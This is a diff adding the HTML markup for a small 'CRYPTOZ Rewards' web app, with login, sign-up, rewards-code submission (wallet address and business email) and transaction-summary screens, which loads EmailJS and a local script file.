@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CRYPTOZ Rewards</title>
+  <link rel="stylesheet" href="style.css">
+ 
+</head>
+<body>
+
+  <!-- Login Screen -->
+  <div id="open-screen">
+    <div class="banner">CRYPTOZ</div>
+    <input type="email" id="login-email" placeholder="Email" aria-label="Login Email">
+    <input type="password" id="login-password" placeholder="Password" aria-label="Login Password">
+    <button id="login-btn">LOGIN</button>
+    <button id="go-to-sign-up">SIGN UP</button>
+  </div>
+
+  <!-- Sign-Up Screen -->
+  <div id="sign-up-screen" style="display: none;">
+    <div class="banner">CRYPTOZ</div>
+    <input type="email" id="sign-up-email" placeholder="Email" aria-label="Sign-Up Email">
+    <input type="password" id="sign-up-password" placeholder="Password" aria-label="Sign-Up Password">
+    <input type="password" id="confirm-password" placeholder="Confirm Password" aria-label="Confirm Password">
+    <button id="sign-up-btn">SIGN UP</button>
+    <button class="back-btn" id="back-to-login">BACK</button>
+  </div>
+
+  <!-- Submit Rewards Screen -->
+  <div id="submit-rewards-screen" style="display: none;">
+    <div class="banner">REWARDS</div>
+    <input type="text" id="voucher-code" placeholder="Rewards Code" aria-label="Rewards Code">
+    <input type="text" id="amount" placeholder="Amount" readonly aria-label="Amount">
+    <input type="text" id="wallet-address" placeholder="Wallet Address" aria-label="Wallet Address">
+    <input type="email" id="business-email" placeholder="Business Email" aria-label="Business Email">
+    <button id="submit-reward-btn">SUBMIT</button>
+    <p id="balance">Balance: $0.00</p>
+    <button class="back-btn" id="back-to-open">BACK</button>
+  </div>
+
+  <!-- Transaction Screen -->
+  <div id="transaction-screen" style="display: none;">
+    <div class="banner">TRANSACTION</div>
+    <ul>
+      <li>Date: <span id="transaction-date"></span></li>
+      <li>Amount Transferred: <span id="transaction-amount"></span></li>
+      <li>Wallet Address: <span id="transaction-wallet"></span></li>
+      <li>Note: Please check your email for transaction details.</li>
+    </ul>
+    <button class="back-btn" id="back-to-submit">BACK</button>
+  </div>
+
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script src="script.js"></script>
+</body>
+</html>
